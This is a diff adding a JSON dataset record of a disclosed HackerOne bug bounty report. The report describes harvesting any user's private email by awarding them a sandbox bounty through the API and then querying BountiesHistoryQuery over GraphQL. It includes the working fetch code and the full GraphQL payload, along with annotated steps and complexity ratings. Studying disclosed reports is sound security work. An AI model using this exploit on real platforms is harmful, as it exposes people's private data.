@@ -1,0 +1,54 @@
+{
+    "reported_to": "HackerOne",
+    "reported_by": "kimingi ",
+    "title": "Creation of bounties through Customer API leads to private email disclosure",
+    "content": "\nSummary:\nHello team,\nIt is possible to reveal any user email using the BountiesHistoryQuery request.\nTo demonstrate this, I will make use of both the API and the graphql requests.\nSteps To Reproduce\nLog in to your account and create a demo\nHead over to https://hackerone.com/organizations/\u2588\u2588\u2588\u2588/settings/api_tokens and create a token with the report manager role\nHead over to any profile of a user in hackerone and copy their user id\nUse this request below to award a program bounty to that user using the API. recipient_id is the id of any user and {id} is your sandbox program id.\nCode 779 Bytes\n1let inputBody = \"{\\n  \\\"data\\\": {\\n    \\\"type\\\": \\\"bounty\\\",\\n    \\\"attributes\\\": {\\n      \\\"recipient_id\\\": \\\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\\",\\n          \\\"amount\\\": 51,\\n      \\\"reference\\\": \\\"newbounty\\\",\\n      \\\"title\\\": \\\"BOUNTY FROM Sandbox\\\",\\n      \\\"currency\\\": \\\"USD\\\",\\n      \\\"severity_rating\\\": \\\"high\\\"\\n    }\\n  }\\n}\";\n2let user = 'identifier';\n3let password = 'token';\n4let headers = new Headers();\n5headers.set('Authorization', 'Basic ' + btoa(user + \":\" + password));\n6  headers.set('Content-Type', 'application/json');  headers.set('Accept', 'application/json');\n7\n8fetch('https://api.hackerone.com/v1/programs/{id}/bounties',\n9{\n10  method: 'POST',\n11  body: inputBody,\n12  headers: headers\n13})\n14.then(function(res) {\n15    return res.json();\n16}).then(function(body) {\n17    console.log(body);\n18});\n19\nYou will get a success message\n\u2588\u2588\u2588\u2588\u2588\u2588\n6. After awarding the bounty, make the following Graphql request. Where handle is the handle of your sandbox team\nCode 995 Bytes\n1{\"operationName\":\"BountiesHistoryQuery\",\"variables\":{\"handle\":\"\u2588\u2588\u2588\u2588\",\"pageSize\":25,\"product_area\":\"other\",\"product_feature\":\"other\"},\"query\":\"query BountiesHistoryQuery($handle: String!, $pageSize: Int!, $cursor: String) {\\n  team(handle: $handle) {\\n    id\\n    currency\\n    offers_bounties\\n    state\\n    bounties(first: $pageSize, after: $cursor) {\\n   pageInfo {\\n        endCursor\\n        hasNextPage\\n        __typename\\n      }\\n         edges {\\n          node {\\n          id\\n    awarded_user{username} invitations{email token}     awarded_amount\\n          awarded_bonus_amount\\n          created_at\\n          report {\\n            id\\n            database_id: _id\\n            reporter {\\n     email          id\\n              username\\n              __typename\\n            }\\n            title\\n            __typename\\n          }\\n          total_awarded_amount\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\nNotice the email of the user is shown in the response\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nReveal any user email\n\n",
+    "severity": [
+        9.3,
+        null
+    ],
+    "bounty": 10500,
+    "weaknesses": [
+        "Information Disclosure"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1711473000,
+    "report_url": "https://hackerone.com/reports/2382120",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Log in to your account and create a demo sandbox program on HackerOne."
+        ],
+        [
+            2,
+            "Create an API token with the report manager role from the API tokens settings page."
+        ],
+        [
+            3,
+            "Identify a target user and copy their user ID from their profile."
+        ],
+        [
+            4,
+            "Use the API to award a bounty to the target user by sending a POST request to the bounties endpoint with the user's ID and necessary bounty details."
+        ],
+        [
+            5,
+            "After successfully awarding the bounty, make a GraphQL request to the BountiesHistoryQuery endpoint to retrieve the bounty history."
+        ],
+        [
+            6,
+            "Observe the response to find the target user's email address exposed in the bounty details."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to disclose any user's private email address by first awarding them a bounty through the HackerOne API and then querying the bounty history via GraphQL. The email is exposed in the response to the GraphQL query.",
+    "reason": "The attack involves multiple steps including API token creation, bounty awarding via API, and querying GraphQL, but each step is straightforward and follows common patterns in API and GraphQL interactions. The interaction between awarding a bounty and then querying for it is not particularly subtle or complex.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
